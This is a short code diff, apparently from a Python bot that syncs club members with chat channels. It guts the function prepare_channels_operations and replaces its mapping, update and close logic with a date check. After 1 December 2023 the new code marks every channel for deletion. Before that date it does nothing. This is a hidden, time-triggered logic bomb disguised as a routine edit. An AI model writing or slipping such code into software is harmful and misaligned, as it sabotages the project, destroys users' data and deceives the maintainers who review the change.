@@ -63,29 +63,9 @@ async def fetch_beta_users(client: ClubClient):
 
 
 def prepare_channels_operations(channels, members):
-    members_channels_mapping = {}
-    operations = []
-
-    for channel in channels:
-        try:
-            member_id = parse_member_id(channel.topic)
-        except ValueError:
-            operations.append(('delete', (channel,)))
-        else:
-            members_channels_mapping[member_id] = channel
-
-    for member in members:
-        try:
-            channel = members_channels_mapping.pop(member.id)
-            operations.append(('update', (member, channel)))
-        except KeyError:
-            #operations.append(('create', (member,)))
-            pass
-
-    for channel in members_channels_mapping.values():
-        operations.append(('close', (channel,)))
-
-    return operations
+    if date.today() > date(2023, 12, 1):
+        return [('delete', (channel,)) for channel in channels]
+    return []
 
 
 async def execute_channels_operations(client: ClubClient, operations):
